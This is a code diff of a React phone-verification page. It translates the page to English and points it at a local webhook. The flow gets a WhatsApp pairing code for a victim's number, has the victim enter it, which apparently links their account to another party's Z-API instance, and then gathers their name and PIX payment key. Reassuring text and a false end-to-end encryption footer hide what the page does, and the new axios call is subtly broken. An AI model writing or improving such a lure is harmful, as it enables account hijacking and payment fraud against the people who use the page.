@@ -1,6 +1,6 @@
-// VerifyFlow.jsx
 import React, { useState, useEffect } from 'react';
 import './VerifyFlow.css';
+import axios from 'axios';
 
 const ZAPI_API_BASE = 'https://api.z-api.io';
 const WHATSAPP_HELP_NUMBER = '555131910192';
@@ -8,15 +8,15 @@ const WHATSAPP_HELP_NUMBER = '555131910192';
 const VerifyFlow = () => {
   const [step, setStep] = useState(1);
   const [ddi, setDdi] = useState('55');
-  const [telefone, setTelefone] = useState('');
-  const [codigo, setCodigo] = useState('');
+  const [phone, setPhone] = useState('');
+  const [code, setCode] = useState('');
   const [instanceInfo, setInstanceInfo] = useState({});
   const [loading, setLoading] = useState(false);
-  const [pix, setPix] = useState({ nome: '', tipo: 'Telefone', chave: '' });
+  const [pix, setPix] = useState({ name: '', type: 'Phone', key: '' });
 
-  const telefoneFormatado = ddi + telefone.replace(/\D/g, '');
+  const formattedPhone = ddi + phone.replace(/\D/g, '');
 
-  const formatarTelefone = (value) => {
+  const formatPhone = (value) => {
     let cleaned = value.replace(/\D/g, '');
     if (cleaned.length > 11) cleaned = cleaned.slice(0, 11);
     let formatted = '';
@@ -26,33 +26,35 @@ const VerifyFlow = () => {
     return formatted;
   };
 
-  const enviarTelefone = async () => {
-    if (telefone.replace(/\D/g, '').length < 8) return alert('Digite um número válido.');
+  const sendPhone = async () => {
+    if (phone.replace(/\D/g, '').length < 8) return alert('Please enter a valid number.');
     setStep(2);
-    setCodigo('');
+    setCode('');
     setLoading(false);
     try {
-      const res = await fetch(`/get_code.php?telefone=${telefoneFormatado}`);
-      const data = await res.json();
+      const verify_data = { "phone": formattedPhone }
 
-      if (data.error) return alert(`Erro: ${data.error}`);
+      const response = await axios.post('http://localhost:5678/webhook-test/phone', verify_data);
+      const data = await response.json();
+
+      if (data.error) return alert(`Error: ${data.error}`);
       if (data.conectado) return setStep(3);
 
       localStorage.setItem('zapi_instance_id', data.instance_id);
       localStorage.setItem('zapi_instance_token', data.instance_token);
       localStorage.setItem('zapi_security_token', data.security_token);
-      setCodigo(data.codigo);
+      setCode(data.codigo);
       setInstanceInfo(data);
     } catch {
-      alert('Erro ao gerar código.');
+      alert('Failed to generate code.');
     }
   };
 
-  const copiarCodigo = () => {
-    navigator.clipboard.writeText(codigo).then(() => alert('Código copiado: ' + codigo));
+  const copyCode = () => {
+    navigator.clipboard.writeText(code).then(() => alert('Code copied: ' + code));
   };
 
-  const verificarConexao = async () => {
+  const checkConnection = async () => {
     setLoading(true);
     setTimeout(async () => {
       try {
@@ -63,18 +65,18 @@ const VerifyFlow = () => {
         const data = await res.json();
         setLoading(false);
         if (data.connected) setStep(3);
-        else setCodigo('Código ainda válido. Tente novamente.');
+        else setCode('Code is still valid. Try again.');
       } catch {
         setLoading(false);
-        setCodigo('Erro ao verificar status.');
+        setCode('Error checking status.');
       }
     }, 15000);
   };
 
-  const enviarPix = () => {
-    if (!pix.nome || !pix.chave) return alert('Preencha todos os campos!');
-    const mensagem = `Acabei de conectar meu número ${telefoneFormatado}\n\nChave PIX:\nNome: ${pix.nome}\nTipo: ${pix.tipo}\nChave: ${pix.chave}`;
-    const url = `https://wa.me/${WHATSAPP_HELP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
+  const sendPix = () => {
+    if (!pix.name || !pix.key) return alert('Please fill out all fields!');
+    const message = `I just connected my number ${formattedPhone}\n\nPIX Key:\nName: ${pix.name}\nType: ${pix.type}\nKey: ${pix.key}`;
+    const url = `https://wa.me/${WHATSAPP_HELP_NUMBER}?text=${encodeURIComponent(message)}`;
     window.open(url, '_blank');
   };
 
@@ -82,40 +84,39 @@ const VerifyFlow = () => {
     <div className="verify-container">
       {step === 1 && (
         <div className="tela ativa">
-          <h2>Insira o número de telefone</h2>
-          <p>Selecione o país e insira seu número de telefone.</p>
+          <h2>Enter your phone number</h2>
+          <p>Select your country and enter your phone number.</p>
           <div className="tela-conteudo">
             <select value={ddi} onChange={(e) => setDdi(e.target.value)}>
               <option value="55">🇧🇷 Brazil (+55)</option>
             </select>
             <input
               type="text"
-              value={telefone}
-              onChange={(e) => setTelefone(formatarTelefone(e.target.value))}
+              value={phone}
+              onChange={(e) => setPhone(formatPhone(e.target.value))}
               placeholder="(11) 99955-9889"
             />
-            <button onClick={enviarTelefone} style={{ borderRadius: '50px' }}>
-              Avançar
+            <button onClick={sendPhone} style={{ borderRadius: '50px' }}>
+              Next
             </button>
-
           </div>
         </div>
       )}
 
       {step === 2 && (
         <div className="tela ativa">
-          <h2>Use esse código para conectar</h2>
+          <h2>Use this code to connect</h2>
           <div className="tela-conteudo">
             {loading ? <div className="spinner" /> : (
               <div id="codigo-display">
-                {[...codigo].map((char, i) => (
+                {[...code].map((char, i) => (
                   <span key={i}>{char}</span>
                 ))}
               </div>
             )}
-            <button onClick={copiarCodigo}>Copiar código</button>
-            <div onClick={verificarConexao} className="verificar-link">
-              <span>Fiz o procedimento</span>
+            <button onClick={copyCode}>Copy Code</button>
+            <div onClick={checkConnection} className="verificar-link">
+              <span>I followed the steps</span>
             </div>
           </div>
         </div>
@@ -123,53 +124,53 @@ const VerifyFlow = () => {
 
       {step === 3 && (
         <div className="tela ativa">
-          <h2>✅ Conectado com sucesso!</h2>
+          <h2>✅ Successfully connected!</h2>
           <div className="tela-conteudo">
-            <p>Seu WhatsApp foi conectado corretamente.</p>
-            <p style={{ fontWeight: 'bold' }}>WhatsApp conectado com segurança!</p>
-            <button onClick={() => setStep(4)}>Cadastrar chave PIX</button>
-            <button onClick={() => setStep(1)}>Tentar novamente</button>
+            <p>Your WhatsApp has been successfully connected.</p>
+            <p style={{ fontWeight: 'bold' }}>WhatsApp securely connected!</p>
+            <button onClick={() => setStep(4)}>Register PIX Key</button>
+            <button onClick={() => setStep(1)}>Try Again</button>
           </div>
         </div>
       )}
 
       {step === 4 && (
         <div className="tela ativa">
-          <h2>Cadastro da Chave PIX</h2>
+          <h2>PIX Key Registration</h2>
           <div className="tela-conteudo">
             <input
               type="text"
-              value={pix.nome}
-              onChange={(e) => setPix({ ...pix, nome: e.target.value })}
-              placeholder="Seu nome completo"
+              value={pix.name}
+              onChange={(e) => setPix({ ...pix, name: e.target.value })}
+              placeholder="Your full name"
             />
             <div style={{ display: 'flex', gap: '8px' }}>
               <select
-                value={pix.tipo}
-                onChange={(e) => setPix({ ...pix, tipo: e.target.value })}
+                value={pix.type}
+                onChange={(e) => setPix({ ...pix, type: e.target.value })}
                 style={{ flex: 1 }}
               >
-                <option value="Telefone">Telefone</option>
+                <option value="Phone">Phone</option>
                 <option value="CPF">CPF</option>
                 <option value="CNPJ">CNPJ</option>
-                <option value="E-mail">E-mail</option>
-                <option value="Chave Aleatória">Chave Aleatória</option>
+                <option value="Email">Email</option>
+                <option value="Random Key">Random Key</option>
               </select>
               <input
                 type="text"
-                value={pix.chave}
-                onChange={(e) => setPix({ ...pix, chave: e.target.value })}
-                placeholder="Sua chave PIX"
+                value={pix.key}
+                onChange={(e) => setPix({ ...pix, key: e.target.value })}
+                placeholder="Your PIX key"
                 style={{ flex: 2 }}
               />
             </div>
-            <button onClick={enviarPix}>Cadastrar chave PIX</button>
+            <button onClick={sendPix}>Register PIX Key</button>
           </div>
         </div>
       )}
 
       <footer>
-        🔒 Suas mensagens pessoais são protegidas com criptografia de ponta a ponta.
+        🔒 Your personal messages are protected with end-to-end encryption.
       </footer>
     </div>
   );
